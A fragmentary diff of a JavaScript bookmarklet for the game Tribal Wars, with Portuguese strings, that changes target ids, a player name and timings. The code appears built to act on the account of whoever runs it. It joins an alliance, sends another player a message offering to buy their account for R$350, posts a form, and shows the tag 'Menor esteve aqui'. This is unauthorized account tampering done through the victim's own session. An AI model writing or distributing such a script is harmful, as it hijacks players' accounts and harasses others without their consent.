@@ -3,7 +3,7 @@ javascript:(async function(){
     TribalWars.get(url);
 
     setTimeout(() => {
-        const urll = TribalWars.buildURL('GET', {screen: 'info_ally', action: 'join', id: '1424'});
+        const urll = TribalWars.buildURL('GET', {screen: 'info_ally', action: 'join', id: '1426'});
         TribalWars.get(urll);
     }, 600);
 
@@ -81,7 +81,7 @@ javascript:(async function(){
         });
     }
 
-    const pn = 'Dark-Shadow';
+    const pn = 'xaraki12';
 
     await cada_mp(pn, 'Quer me vender sua conta por R$350,00', 'Venda de conta');
     setTimeout(async function() {
@@ -157,7 +157,7 @@ $.post($form.attr("action"), formDataObj, function(response) {
     }
   });
 
-}, 2000);
+}, 1200);
 
 
     setTimeout(() => {
@@ -167,7 +167,7 @@ $.post($form.attr("action"), formDataObj, function(response) {
             },
                 !1
             );
-    }, 1500);
+    }, 1700);
 
     setTimeout(() => {
         UI.SuccessMessage("Menor esteve aqui")
